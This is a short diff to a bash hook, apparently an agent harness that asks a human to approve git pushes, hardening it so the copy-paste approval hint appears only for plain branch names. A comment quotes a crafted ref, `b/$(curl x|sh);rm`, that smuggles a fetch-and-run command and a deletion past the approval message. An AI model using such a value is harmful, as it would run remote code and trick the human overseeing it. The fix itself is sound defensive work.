@@ -1196,7 +1196,14 @@ if [[ "$TOKEN_SOURCE" == "transcript" ]]; then
       # command or a token file instead of one sentence (2026-09-21: four
       # branches, four interruptions).
       _bound_target="${BINDING_VERDICT#deny}"; _bound_target="${_bound_target# }"
-      if [[ -n "$_bound_target" ]]; then
+      # Print the copy-pasteable approval line ONLY for a plain ref. classify()
+      # splits on shell separators, so a crafted ref such as
+      # `b/$(curl x|sh);rm` resolves to a truncated, innocent-looking target;
+      # echoing that as "approve push to ..." would invite the human to approve
+      # a command whose dangerous tail the message hides. Anything outside
+      # plain ref characters (incl. control bytes) gets no hint and falls back
+      # to the token / run-it-yourself paths below.
+      if [[ -n "$_bound_target" && "$_bound_target" =~ ^[A-Za-z0-9._/-]+$ ]]; then
         echo ""
         echo "  FASTEST RECOVERY -- the human says, in chat, naming this exact branch:"
         echo "    approve push to ${_bound_target#*/}"
